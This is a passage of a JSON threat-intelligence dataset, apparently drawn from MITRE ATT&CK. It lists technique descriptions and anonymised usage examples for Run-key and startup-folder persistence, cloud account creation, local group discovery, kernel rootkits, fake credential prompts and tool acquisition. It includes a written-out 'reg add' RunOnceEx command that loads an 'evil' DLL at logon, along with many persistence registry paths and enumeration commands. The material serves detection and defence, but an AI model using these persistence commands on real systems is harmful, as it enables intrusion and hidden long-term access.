      "New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "has added itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence.",
      "adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot.",
      "can copy itself into the current users Startup folder as Narrator.exe for persistence.",
      "used the startup folder for persistence.",
      "uses run keys for persistence on Windows.",
      "achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.",
      "uses PowerShell to add a Registry Run key in order to establish persistence.",
      "creates a Registry Run key to establish persistence.",
      "has dropped an executable file to the startup directory.",
      "achieved persistence by placing a malicious executable in the startup directory and has added the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to the Registry.",
      "has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\ and dropped a shortcut in %STARTUP%.",
      "has used malicious DLLs that setup persistence in the Registry Key `HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run`.",
      "can write itself to the Startup folder to gain persistence.",
      "creates an entry in a Registry Run key for the malware to execute on startup.",
      "To establish persistence  identifies the Start Menu Startup directory and drops a link to its own executable disguised as an Office Start Yahoo Talk MSN Gaming Z0ne or MSN Talk shortcut.",
      "installs a registry Run key to establish persistence.",
      "adds Registry Run keys to establish persistence.",
      "can establish persistence by dropping a sample of itself to `C:\\ProgramData\\Local Settings\\Temp\\mskmde.com` and adding a Registry run key to execute every time a user logs on.",
      "sets up a Registry Run key to establish a persistence mechanism.",
      "has created Registry Run keys to establish persistence.",
      "has added persistence to the `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` Registry key.",
      "has used Windows Registry run keys such as `HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts` to maintain persistence.",
      "achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.",
      "used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\\[a-f0-9A-F]{8} to maintain persistence.",
      "miner has created UPX-packed files in the Windows Start Menu Folder.",
      "adds Run key entries in the Registry to establish persistence.",
      "has added persistence via the Registry key software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help.",
      "has established persistence by being copied to the Startup directory or through the `\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key.",
      "saved malicious files within the AppData and Startup folders to maintain persistence.",
      "has the ability to modify a Registry Run key to establish persistence.",
      "has added a Registry Run key to establish persistence.",
      "has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.",
      "can create a shortcut in the Windows startup folder for persistence.",
      "adds several Registry entries to enable automatic execution at every system startup.",
      "achieves persistence by setting a Registry Run key with the path depending on whether the victim account has user or administrator access.",
      "creates a Registry entry to ensure infection after reboot under HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run.",
      "can establish persistence with the auto start function including using the value `EverNoteTrayUService`.",
      "creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.",
      "During  a first-stage downloader installed  to `%Startup%\\mssync.exe` on a compromised host.",
      "gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.",
      "Some  variants establish persistence by modifying the Registry key HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.",
      "is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.",
      "has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.",
      "has used a persistence module that stores the implant inside the Registry which executes at logon.",
      "has created the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU to maintain persistence.",
      "added a spoofed binary to the start-up folder for persistence.",
      "has been known to establish persistence by adding programs to the Run Registry key.",
      "has placed scripts in the startup folder for persistence and modified the `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce` Registry key.",
      "adds itself to a Registry Run key with the name guidVGA or guidVSA.",
      "has added the registry value ntdll to the Registry Run key to establish persistence.",
      "establishes persistence through a Registry Run key.",
      "can use a Registry Run key to establish persistence.",
      "establishes persistence by creating a .lnk shortcut to itself in the Startup folder.",
      "has established persistence by creating a Registry run key.",
      "has achieved persistence via writing a PowerShell script to the autorun registry key.",
      "modifies the %regrun% Registry to point itself to an autostart mechanism.",
      "can establish persistence by writing the Registry value MicroNativeCacheSvc to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "places scripts in the startup folder for persistence.",
      "adds a Registry Run key for ctfmon.exe to establish persistence.",
      "The  3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.",
      "has changed the Startup folder to the one containing its executable by overwriting the registry keys.",
      "uses registry run keys for persistence.",
      "has been known to establish persistence by adding programs to the Run Registry key.",
      "can establish persistence via the Registry under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.",
      "may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.",
      "has deployed a tool known as  to the Startup folder of a victim and used Registry run keys to gain persistence.",
      "has used a batch script that adds a Registry Run key to establish malware persistence.",
      "adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run for persistence.",
      "achieves persistence by adding a shortcut of itself to the startup path in the Registry.",
      "can use the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key for persistence.",
      "adds persistence by creating Registry Run keys.",
      "Several  backdoors achieved persistence by adding a Run key.",
      "has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys as well as by creating shortcuts in the Internet Explorer Quick Start folder.",
      "creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.",
      "can establish a LNK file in the startup folder for persistence.",
      "has dropped malicious files into the startup folder `%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` on a compromised host in order to maintain persistence.",
      "establishes Persistence by setting the HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load Registry key to point to its executable.",
      "has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence.",
      "has the ability to create the Registry key name EstsoftAutoUpdate at HKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce to establish persistence.",
      "can install a Registry Run key for persistence.",
      "establishes persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key.",
      "establishes persistence under the Registry key HKCU\\Software\\Run auto_update.",
      "creates a startup item for persistence.",
      "has added a registry key in the <RUN> hive for persistence.",
      "establishes persistence in the Startup folder.",
      "adds a shortcut file to the startup folder for persistence.",
      "attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails it attempts to add Registry Run keys.",
      "achieves persistence by using various Registry Run keys.",
      "can set the AutoRun Registry key with a PowerShell command.",
      "tools have registered Run keys in the registry to give malicious VBS files persistence.",
      "is capable of writing to a Registry Run key to establish.",
      "can create or add files to Registry Run Keys to establish persistence.",
      "can establish persistence with the auto start function including using the value `EverNoteTrayUService`.",
      "has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder.",
      "established persistence using Registry Run keys both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.",
      "can use Registry Run Keys for persistence.",
      "If establishing persistence by installation as a new service fails one variant of  establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry keys for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self] and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD.",
      "has modified the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key for persistence.",
      "created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.",
      "will use a Registry key to achieve persistence through reboot setting a RunOnce key such as: HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce{random value name} = rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s {dropped copy path and file name}.",
      "can create an autorun entry for a PowerShell script to run at reboot.",
      "created and modified startup files for persistence.  added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for .",
      "has been placed in the start up folder to trigger execution upon user login.",
      "used registry run keys for process execution during initial victim infection.",
      "can set an AutoRun key to establish persistence.",
      "has established persistence by creating entries in `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.",
      "maintains persistence following system checks through the Run key in the registry.",
      "has created Windows Registry Run keys that execute various batch scripts to establish persistence on victim devices.",
      "can use a Registry Run key to establish persistence at startup.",
      "has created an autorun Registry key through the `-safeboot-instance -pass` command line argument.",
      "used Run registry keys with names such as `OneNote Update` to execute legitimate executables that would load through search-order hijacking malicious DLLS to ensure persistence during .",
      "has created registry keys to maintain persistence using `HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`.",
      "can persist using malicious LNK objects in the victim machine Startup folder.",
      "has used Registry Run keys for persistence.",
      "establishes persistence by copying its executable in a subdirectory of `%APPDATA%` or `%PROGRAMFILES%` and then modifies Windows Registry Run keys or policies keys to execute the executable on system start."
    ],
    "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems:* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" (Citation: Oddvar Moe RunOnceEx Mar 2018)Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.The following Registry keys can be used to set startup folder items for persistence:* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders* HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:* HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run* HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.By default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
    "similar_words": [
      "Registry Run Keys / Startup Folder"
    ],
    "id": "T1547.001"
  },
  "attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b": {
    "name": "Cloud Account",
    "example_uses": [
      "can create new users through Azure AD.",
      "has created global admin accounts in the targeted organization's cloud instances to gain persistence.",
      "can create new Azure AD users."
    ],
    "description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
    "similar_words": [
      "Cloud Account"
    ],
    "id": "T1136.003"
  },
  "attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b": {
    "name": "Local Groups",
    "example_uses": [
      "has used net localgroup and net localgroup Administrators to enumerate group information including members of the local administrators group.",
      "can obtain the permissions of the victim user.",
      "collects the group name of the logged-in user and sends it to the C2.",
      "can collect information about local groups and members.",
      "can obtain a list of local groups and members.",
      "has used the ShowLocalGroupDetails command to identify administrator user and guest accounts on a compromised host.",
      "may collect local group information by running net localgroup administrators or a series of other commands on a victim.",
      "During  the threat actors used the command `net localgroup adminstrator ` to identify accounts with local administrator rights.",
      "has run `net localgroup` to enumerate local groups.",
      "During  threat actors used the command `net localgroup administrators` to list all administrators part of a local group.",
      "can use net localgroup to enable discovery of local groups.",
      "can use net localgroup to list local groups on a system.",
      "Commands such as net group and net localgroup can be used in  to gather information about and manipulate groups.",
      "contains modules such as Get-LocAdm for enumerating permission groups.",
      "gathers information about local groups and members.",
      "actors used the following command following exploitation of a machine with  malware to list local groups: net localgroup administrator >> %temp%\\download",
      "has the capability to execute the command net localgroup administrators.",
      "has been used to execute the net localgroup administrators command on a targeted system.",
      "During  the threat actors used the `net group` command as part of their advanced reconnaissance.",
      "has used net localgroup administrators to identify accounts with local administrative rights.",
      "can obtain a list of local groups of users from a system.",
      "has checked the local administrators group.",
      "gathers information on local group names.",
      "has enumerated the local administrators group.",
      "has run `net localgroup administrators` in compromised environments to enumerate accounts.",
      "has used net localgroup administrators to find local administrators on compromised systems.",
      "enumerates the privilege level of the victim during the initial infection.",
      "collects a list of users belonging to the local users and administrators groups with the commands net localgroup administrators and net localgroup users.",
      "can discover local group memberships.",
      "checks whether the process is running with privileged local access during execution.",
      "checks the effective group ID of its process when initially executed to determine if it is in group 0 denoting superuser privileges in Linux environments."
    ],
    "description": "Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such as net localgroup of the [Net](https://attack.mitre.org/software/S0039) utility, dscl . -list /Groups on macOS, and groups on Linux can list local groups.",
    "similar_words": [
      "Local Groups"
    ],
    "id": "T1069.001"
  },
  "attack-pattern--a0e6614a-7740-4b24-bd65-f1bde09fc365": {
    "name": "Search Open Websites/Domains",
    "example_uses": [
      "researched Ukraine's unique legal entity identifier (called an EDRPOU number) including running queries on the EDRPOU website in preparation for the  attack.  has also researched third-party websites to help it craft credible spearphishing emails.",
      "has conducted pre-compromise web searches for victim information.",
      "has used open-source research to identify information about victims to use in targeting.",
      "has used LLMs to identify think tanks government organizations etc. that have information."
    ],
    "description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",
    "similar_words": [
      "Search Open Websites/Domains"
    ],
    "id": "T1593"
  },
  "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6": {
    "name": "Kernel Modules and Extensions",
    "example_uses": [
      "can use kernel modules to establish persistence.",
      "has the ability to install several loadable kernel modules (LKMs) on infected machines.",
      "During  attackers used a signed kernel rootkit to establish additional persistence."
    ],
    "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming)When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide)Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
    "similar_words": [
      "Kernel Modules and Extensions"
    ],
    "id": "T1547.006"
  },
  "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d": {
    "name": "GUI Input Capture",
    "example_uses": [
      "prompts users for their credentials.",
      "prompts the user for their credentials.",
      "has displayed fake forms on top of banking sites to intercept credentials from victims.",
      "presents an input prompt asking for the user's login and password.",
      "prompts the users for credentials.",
      "prompts the user for their credentials.",
      "has presented victims with spoofed Windows Authentication prompts to collect their credentials.",
      "prompts the user for credentials.",
      "can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.",
      "prompts the user to input credentials using a native macOS dialog box leveraging the system process /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment.",
      "`credphisher.py` module can prompt a current user for their credentials.",
      "prompts the user for credentials through a Microsoft Outlook pop-up.",
      "has captured passwords by prompting victims with a macOS needs to access System Settings GUI window."
    ],
    "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
    "similar_words": [
      "GUI Input Capture"
    ],
    "id": "T1056.002"
  },
  "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0": {
    "name": "Tool",
    "example_uses": [
      "has obtained and used tools such as   and .",
      "has obtained and customized publicly-available tools like .",
      "During the  campaign  obtained and used tools such as Mimikatz and PsExec.",
      "has obtained and used open-source tools such as .",
      "has obtained and used tools like   Metasploit  and Plink.",
      "For  the threat actors obtained packers such as CyaX.",
      "has obtained tools such as PuTTY for use in their operations.",
      "has obtained and used tools such as Nirsoft WebBrowserPassVIew  and .",
      "has obtained and used tools such as Putty SNScan and  for its operations.",
      "MuddyWater has made use of legitimate tools ConnectWise and Remote Utilities to gain access to target environment.",
      "has obtained tools such as RVTools and AD Explorer for their operations.",
      "In the   used tools such as Mimikatz and other open-source software.",
      "has obtained and used tools such as    and .",
      "has obtained and used a variety of tools including     and .",
      "has obtained and used open-source tools like   and .",
      "has utilized tools such as       Metasploit Advanced IP Scanner Nirsoft PingInfoView and SoftPerfect Network Scanner for targeting efforts.",
      "has obtained and used open source scripts from GitHub.",
      "has obtained and used open-source tools such as   and .",
      "has used and modified open-source tools like   and .",
      "has obtained and used tools such as    and .",
      "has used open-source tools such as  for targeting efforts.",
      "has used a variety of tools in their operations including    and .",
      "has modified and used customized versions of publicly-available tools like PLINK and .",
      "has used a variety of widely-available tools which in some cases they modified to add functionality and/or subvert antimalware solutions.",
      "has obtained and used open-source tools such as   and .",
      "has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.",
      "has used open-source tools including customized versions of the Iox proxy tool NPS tunneling tool Meterpreter and a keylogger that uploads data to Alibaba cloud storage.",
      "has used commodity remote access tools.",
      "has obtained and used tools such as   and .",
      "has acquired open-source tools for their operations including  which was used to establish an encrypted channel from a compromised host to 's C2 server in preparation for the 2018 Winter Olympics attack as well as  and RemoteExec which were used in their 2022  operations.",
      "has obtained and used open-source tools such as .",
      "has utilized a variety of tools such as   and the remote management tool Atera for targeting efforts.",
      "For  the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.",
      "has obtained an ARP spoofing tool from GitHub.",
      "During  threat actors obtained and used tools such as .",
      "obtained and used a modified variant of .",
      "has obtained and used  for post-exploitation activities.",
      "has utilized publicly available tools such as   PWdump7 ProcDump Nmap and Incognito V2 for targeting efforts.",
      "has obtained and used a variety of tools including    and .",
      "For  the threat actors used  configured with a modified variation of the publicly available Pandora Malleable C2 Profile.",
      "has obtained and used tools such as .",
      "has obtained and used tools such as      and .",
      "has obtained a variety of tools for their operations including  and PuTTy PSCP.",
      "has obtained and used a customized version of  as well as use other tools such as   and .",
      "has obtained and used tools such as  and .",
      "has used the commercial tool DiskCryptor.",
      "For  the threat actors obtained a variety of open source tools including JexBoss KeeThief and .",
      "During  the threat actors obtained open source tools to use in their operations.",
      "has obtained and used tools such as AirVPN and plink in their operations.",
      "has obtained and used tools such as  and .",
      "has acquired and sometimes customized open source tools such as   VNC remote access software and DIG.net.",
      "has obtained and used tools such as .",
      "has relied on publicly-available software to gain footholds and establish persistence in victim environments.",
      "has obtained and used tools such as   and .",
      "has acquired open source tools such as  and Meterpreter for their operations.",
      "has acquired and used  in its operations.",
      "obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations.",
      "has obtained and used open-source tools such as .",
      "has acquired and used a variety of open source tools.",
      "has obtained and leveraged publicly-available tools for early intrusion activities.",
      "For   obtained tools such as Wake-On-Lan  ChromePass and dbxcli.",
      "has obtained open source tools for its operations including JsonCPP and Psiphon.",
      "has obtained and used tools such as  and  and a variety of other open-source tools from GitHub.",
      "For  the threat actors acquired a variety of open source tools including   SoftPerfect Network Scanner AnyDesk and PDQ Deploy.",
      "has obtained and used tools such as  and .",
      "has obtained and modified versions of publicly-available tools like  and .",
      "has obtained and used tools such as    and .",
      "has used Microsoft's Console Debugger in some of their operations.",
      "has used Metasploit  and AirVPN for post-exploitation activities.",
      "has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.",
      "During   obtained and used multiple tools including the LINpeas privilege escalation utility aws_consoler rsocx reverse proxy Level RMM tool and RustScan port scanner.",
      "For  UNC3890 actors obtained multiple publicly-available tools including METASPLOIT UNICORN and NorthStar C2.",
      "has used customized versions of open-source tools for C2.",
      "For  the threat actors obtained and used .",
      "has obtained and used publicly-available tools like .",
      "For  the threat actors obtained a variety of tools including  AnyDesk and Process Hacker.",
      "For   obtained publicly available tools such as YSoSerial.NET ConfuserEx and BadPotato.",
      "For  the threat actors used a modified version of the open source  remote administration tool.",
      "has obtained and used tools such as .",
      "During  threat actors leveraged tools including Interactsh to identify vulnerable targets PySoxy to simultaneously dispatch traffic between multiple endpoints BusyBox to enable post exploitation activities and Kubo Injector to inject shared objects into process memory.",
      "has used various open-source tools for privilege escalation purposes.",
      "has obtained and used open-source tools such as  and .",
      "has obtained and used tools such as   and .",
      "MuddyWater has used legitimate tools   and SimpleHelp to gain access to the target environment.",
      "has acquired open-source tools for their operations including  which was used to establish an encrypted channel from a compromised host to 's C2 server in preparation for the 2018 Winter Olympics attack as well as  and RemoteExec which were used in their 2022  operations. Additionally  has used   and .",
      "has acquired and used several tools including MegaSync AnyDesk  and .",
      "has incorporated the open-source EvilGinx framework into their spearphishing activity.",
      "has used various legitimate tools such as `mshta.exe` and  and services during operations.",
      "has used multiple tools for discovery and defense evasion purposes on compromised hosts.",
      "has used legitimate network and forensic tools and customized versions of open-source tools for C2.",
      "During  threat actors used tools including Advanced Port Scanner  and .",
      "acquired various legitimate and malicious tools such as RMM software and commodity malware packages for operations.",
      "has made use of the publicly available tools including Plink and .",
      "has used tools such as Adminer during intrusions.",
      "During  threat actors used tools including the XMRig miner and Interactsh.",
      "During  threat actors used the GO Simple Tunnel (GOST) reverse proxy tool.",
      "has used publicly-available tools such as a Python-based cookie stealer for Chrome browsers  and the Venom proxy tool.",
      "has used publicly available tooling to exploit vulnerabilities.",
      "leverages a C2 framework sourced from a publicly-available Github repository for administration of relay nodes.",
      "has used built-in features in the Microsoft 365 environment and publicly available tools to avoid detection."
    ],
    "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
    "similar_words": [
      "Tool"
    ],
    "id": "T1588.002"
  },
  "attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829": {
    "name": "Exfiltration over USB",
    "example_uses": [
      "copies staged data to removable drives when they are inserted into the system.",
